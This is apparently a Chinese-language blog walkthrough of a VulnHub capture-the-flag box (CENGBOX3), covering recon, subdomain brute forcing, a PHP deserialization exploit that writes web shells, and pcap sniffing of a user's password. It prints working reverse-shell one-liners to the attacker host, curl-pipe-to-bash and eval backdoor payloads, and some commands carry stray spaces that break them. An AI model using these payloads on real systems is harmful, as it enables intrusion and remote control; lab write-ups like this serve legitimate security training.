 教程链接地址 1: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE4MDE1OTA3&#34;&gt;https://blog.csdn.net/weixin_50688050/article/details/118015907&lt;/span&gt;&lt;br&gt;
 教程链接地址 2: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc3ltOTQ1L3AvMTQzMDM3MjguaHRtbA==&#34;&gt;https://www.cnblogs.com/sym945/p/14303728.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 CENGBOX3：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1121.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.25 靶机开放端口 22,80,443&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTYv&#34;&gt;http://192.168.31.96/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1122.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMxLjk2Lw==&#34;&gt;https://192.168.31.96/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1123.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击隐藏详情，输入 thisisunsafe 即可进入该站点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1124.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫描目录:&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.31.96/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1125.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有找到有价值的目标，得去尝试一下 443 端口的网站有没有什么敏感目录  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://192.168.31.96/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1126.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;nmamp-端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nmamp-端口扫描&#34;&gt;#&lt;/a&gt; nmamp 端口扫描&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;发现 gobuster 无法爆破此类网址，只能另寻它法，按理说 web 站点必有破绽才能进一步渗透，但是现在的 web 没有任何的突破口，是不是我们从端口扫描那里就出现了问题这次通过 - A 参数详细的扫描一波端口信息，看能否获得更多的信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.96&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1127.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了一个 ceng-company.vm 的字样，这个可以做为 hosts 做 DNS 解析，修改本地 hosts 文件，将此域名的 DNS 解析指向 ip 地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1128.png&#34; width=&#34;260&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;解析成功了，可以直接访问这个域名了，接下来就对这个域名做测试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1129.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;首先就是测试目录，看有哪些目录  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://ceng-company.vm/](http://ceng-company.vm/)&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1130.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;还是这几个目录，没有多大的作用，下一步对域名做一个子域名扫描&lt;/p&gt;
&lt;h3 id=&#34;gobuster-爆破子域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gobuster-爆破子域名&#34;&gt;#&lt;/a&gt; gobuster 爆破子域名&lt;/h3&gt;
&lt;p&gt;爆破子域名的时候选用 vhost 参数，字典可以根据自己的习惯选择这里使用的是 seclists 中的一个子域名爆破字典&lt;br&gt;
 &lt;code&gt;gobuster vhost -u [http://ceng-company.vm/](http://ceng-company.vm/) -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1131.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;也可以选用较大的字典爆破子域名  &lt;code&gt;gobuster vhost -u http://ceng-company.vm/ -w /usr/share/wordlists/dirb/big.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1132.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到一个子域名，同样修改本地 hosts 文件，改变 DNS 解析指向&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1133.png&#34; width=&#34;290&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Rldi5jZW5nLWNvbXBhbnkudm0=&#34;&gt;http://dev.ceng-company.vm&lt;/span&gt; 做信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1134.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;同样的先来做一波目录扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dev.ceng-company.vm/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1135.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有什么敏感的目录，目录扫描无法得到更多有效的线索&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-注入&#34;&gt;#&lt;/a&gt; sqlmap 注入&lt;/h3&gt;
&lt;p&gt;既然这个子域名的首页是登录框，登录框就可以尝试使用 sql 注入，通过 burp 将数据包拦截，复制该数据包&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1136.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 sqlmap 指定发送数据为此数据包中的内容&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1137.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r login.txt --batch --dbs&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1138.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接爆破的时候是失败的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1139.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;指定注入点是 username 时再次尝试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1140.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;指定注入点是 passwd 时再次尝试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1141.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;前面几种方式都试了，试不出来此地方是存在 sql 注入的，没有找到其余人是怎么通过这个点拿到数据库的信息的，数据库中的信息如下，可通过下列两个账号登陆到后台&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1142.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;admin@ceng-company.vm：admin*_2020&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;elizabethsky@ceng-company.vm：walnuttree&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;php反序列化漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化漏洞&#34;&gt;#&lt;/a&gt; php 反序列化漏洞&lt;/h3&gt;
&lt;p&gt;进入比较高权限的 admin 的后台&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1143.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这里有一个可以输入的地方，输入 1,2,3 尝试是否有回显&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1144.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提交之后，显示发送成功，并且有一个链接可以跳转&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1145.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;此链接显示了 1,3 位置的数据，我们可以放一些恶意 payload 尝试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1146.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在输入框依次填写如下内容，看 phpinfo 是否会被执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1147.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;回显中并没有 phpinfo 的信息，只留下来了第三个位置的数字&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1148.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;把 phpinfo 放在第三个位置看看有没有什么回显&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1149.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看来 phpinfo 的信息没有被执行，跟 1,3 的位置无关&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1150.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看源码里，只是以一种字符串的形势存在&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1151.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;php反序列化-get&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化-get&#34;&gt;#&lt;/a&gt; php 反序列化 GET&lt;/h3&gt;
&lt;p&gt;仔细观察 url 地址，发现是一个 url 编码后的地址&lt;br&gt;
通过在线 url 解码：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5hYjE3My5jb20vZW5jL3VybGVuY29kZS5waHA=&#34;&gt;http://www.ab173.com/enc/urlencode.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://dev.ceng-company.vm/addpoem.php?data=O:4:&amp;quot;Poem&amp;quot;:3:&amp;#123;s:8:&amp;quot;poemName&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:10:&amp;quot;isPoetrist&amp;quot;;O:8:&amp;quot;poemFile&amp;quot;:2:&amp;#123;s:8:&amp;quot;filename&amp;quot;;s:22:&amp;quot;/var/www/html/poem.txt&amp;quot;;s:8:&amp;quot;poemName&amp;quot;;s:1:&amp;quot;1&amp;quot;;&amp;#125;s:9:&amp;quot;poemLines&amp;quot;;s:18:&amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1152.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现这就是一个 php 反序列化漏洞，在我们要上传的 phpinfo 的地方出构造一 GET 方法，通过该 GET 方法调用 php 执行系统命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;O:4:&amp;quot;Poem&amp;quot;:3:&amp;#123;s:8:&amp;quot;poemName&amp;quot;;s:4:&amp;quot;ada&amp;quot;;s:10:&amp;quot;isPoetrist&amp;quot;;O:8:&amp;quot;poemFile&amp;quot;:2:&amp;#123;s:8:&amp;quot;filename&amp;quot;;s:22:&amp;quot;/var/www/html/poem.php&amp;quot;;s:8:&amp;quot;poemName&amp;quot;;s:47:&amp;quot;&amp;lt;?php echo shell_exec($_GET[&#39;cmd&#39;].&#39; 2&amp;gt;&amp;amp;1&#39;); ?&amp;gt;&amp;quot;;&amp;#125;s:9:&amp;quot;poemLines&amp;quot;;s:4:&amp;quot;adadd&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;表示往主站 poem.php 写入一个 cmd 的 GET 方法，方法中的内容用系统执行&lt;/p&gt;
&lt;p&gt;将此内容进行 url 编码后添加到 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Rldi5jZW5nLWNvbXBhbnkudm0vYWRkcG9lbS5waHA/ZGF0YT0=&#34;&gt;http://dev.ceng-company.vm/addpoem.php?data=&lt;/span&gt; 执行之后没有报错，poem.php 文件写入成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1153.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;执行 id 方法，输出 id 的一些信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1154.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看 ifconfig 的 ip 信息时，通过查看源代码也能很方便的看到&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1155.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;现在这个地方已经被升级成为了 RCE 命令执行漏洞，查看服务器有下列哪些反弹 shell 的命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://ceng-company.vm/poem.php?cmd=which%20python;which%20nc;which%20curl;which%20wget;which%20php&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1156.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现存在 nc，curl，wget，php 可以依次尝试使用反弹 shell 的命令&lt;/p&gt;
&lt;h3 id=&#34;反弹shell总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell总结&#34;&gt;#&lt;/a&gt; 反弹 shell 总结&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nc 192.168.31.84 4445 -e /bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1157.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31. 84 /444 5 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1158.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31. 84 /444 5 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1159.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;192.168.31. 84 &amp;quot;,444 5 );exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1160.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;如果有服务器的话，可以直接接服务器的马执行，这里我没有开启远程公网 ip 上的服务器，就直接在本地开了一个简易的 web&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在 192.168.31.25的机器上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.84/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python 3 -m httpserver 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在 192.168.31. 84 的机器上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc - lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过网站去执行：curl &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUvc2hlbGwuc2g=&#34;&gt;http://192.168.31.25/shell.sh&lt;/span&gt; | bash&lt;br&gt;
 表示加载 shell.sh 的内容之后用 bash 去执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1161.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最后通过 curl 的方式拿到了 webshell，利用相关代码进行标准 shell 的输出&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1162.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;php反序列化-post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化-post&#34;&gt;#&lt;/a&gt; php 反序列化 POST&lt;/h3&gt;
&lt;p&gt;既然我们可以通过 GET 型的注入升级为 RCE，看看有没有其他的方法，先搞一个简单的 phpinfo 给指定路径上传 phpinfo 进行执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1163.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;O:4:&amp;quot;Poem&amp;quot;:3:&amp;#123;s:8:&amp;quot;poemName&amp;quot;;s:3:&amp;quot;aba&amp;quot;;s:10:&amp;quot;isPoetrist&amp;quot;;O:8:&amp;quot;poemFile&amp;quot;:2:&amp;#123;s:8:&amp;quot;filename&amp;quot;;s:18:&amp;quot;/var/www/html/x.php&amp;quot;;s:8:&amp;quot;poemName&amp;quot;;s:18:&amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;;&amp;#125;s:9:&amp;quot;poemLines&amp;quot;;s:3:&amp;quot;aba&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;意指往主站 x.php 上打印一个&lt;?php phpinfo();?&gt;的记录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1164.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;url 编码后去执行这个 x.php，回显出来了 phpinfo 的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1165.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 post 型参数，上传一句话后门到主站的 y.php&lt;/p&gt;
&lt;p&gt;&lt;code&gt;O:4:&amp;quot;Poem&amp;quot;:3:&amp;#123;s:8:&amp;quot;poemName&amp;quot;;s:3:&amp;quot;aba&amp;quot;;s:10:&amp;quot;isPoetrist&amp;quot;;O:8:&amp;quot;poemFile&amp;quot;:2:&amp;#123;s:8:&amp;quot;filename&amp;quot;;s:19:&amp;quot;/var/www/html/y.php&amp;quot;;s:8:&amp;quot;poemName&amp;quot;;s:27:&amp;quot;&amp;lt;?php @eval($_POST[&#39;x&#39;]);?&amp;gt;&amp;quot;;&amp;#125;s:9:&amp;quot;poemLines&amp;quot;;s:3:&amp;quot;aba&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1166.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;url 编码后通过 url 执行，成功写到网站根目录上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1167.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;POST 型木马可以通过蚁剑等工具直接链接，地址是主站的 y.php，密码是 x&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1168.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过写如下新文件，将服务器的 shell 反弹出来&lt;br&gt;
 &lt;code&gt;&amp;lt;?php system(&amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.84 4445 &amp;gt;/tmp/f&amp;quot;);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1169.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;指的是如果存在命名管道 /tmp/f 先删掉它，然后新建一个命名管道 /tmp/f&lt;br&gt;
 并且通过 cat 往命名管道中打印 /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.84 4445 这个命令&lt;br&gt;
 /bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.84 4445 表示用 sh 强制交互式执行并将输出&lt;br&gt;
结果重定向，然后将输出内容反弹到 192.168.31.84 的 4445 端口上&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1170.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对终端进行调整，输出一个较为美观的终端&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1171.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;php反序列化-mkfifo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化-mkfifo&#34;&gt;#&lt;/a&gt; php 反序列化 mkfifo&lt;/h3&gt;
&lt;p&gt;既然可以通过 POST 间接的使用 mkfifo 注入 RCE，那么是否可以直接在 php 反序列化里边直接上传 mkfifo 的命令反弹 shell 呢，尝试一下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;O:4:&amp;quot;Poem&amp;quot;:3:&amp;#123;s:8:&amp;quot;poemName&amp;quot;;s:3:&amp;quot;aba&amp;quot;;s:10:&amp;quot;isPoetrist&amp;quot;;O:8:&amp;quot;poemFile&amp;quot;:2:&amp;#123;s:8:&amp;quot;filename&amp;quot;;s:19:&amp;quot;/var/www/html/z.php&amp;quot;;s:8:&amp;quot;poemName&amp;quot;;s:100:&amp;quot;&amp;lt;?php system(&amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.135 4444 &amp;gt;/tmp/f&amp;quot;);?&amp;gt;&amp;quot;;&amp;#125;s:9:&amp;quot;poemLines&amp;quot;;s:3:&amp;quot;aba&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1172.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示上传成功了，但是在 z.php 执行的时候失败的，这种方法可能被过滤掉了，因此目前只有通过注入 GET 参数，在 url 界面使用 curl 反弹或者注入 POST 参数，在蚁剑中用 mkfifo 的方式反弹&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1173.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;tcpdump抓取数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tcpdump抓取数据包&#34;&gt;#&lt;/a&gt; tcpdump 抓取数据包&lt;/h3&gt;
&lt;p&gt;对 webshell 做一个 pspy 监控看有没有定时任务&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1174.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;追踪定期执行的任务 /opt/login.py, 只有拿到 eric 的权限才能查看&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1175.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然是登陆的脚本，肯定是有数据传送的，看了一下服务器上是存在 tcpdump 的，可以借用这个工具来监视数据包的传输，说不定能在数据包里有发现  &lt;code&gt;tcpdump -i lo -w login.pcapng&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1176.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;抓了大概三分钟的数据之后将 login.pcapng 发送至 kali 上目标 webshell 上不存在 scp 命令也无法通过 python 的简易 web 打开&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1177.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;就将这个文件移动到了 /var/www/html 中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1178.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接通过浏览器打开这个文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1179.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;页面中存在着 eric 的用户名和密码 &lt;code&gt;3ricThompson%2ACovid19&lt;/code&gt; ，但是后面还有一些奇怪的字符，不足以确定密码是多少，还是下载下来分析一番&lt;/p&gt;
&lt;h3 id=&#34;uid0的定时任务反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#uid0的定时任务反弹&#34;&gt;#&lt;/a&gt; UID=0 的定时任务反弹&lt;/h3&gt;
&lt;p&gt;用 kali 机器下载此文件，用 strings 分析，得到了 &lt;code&gt;3ricThompson%2ACovid19&lt;/code&gt;&lt;/p&gt;
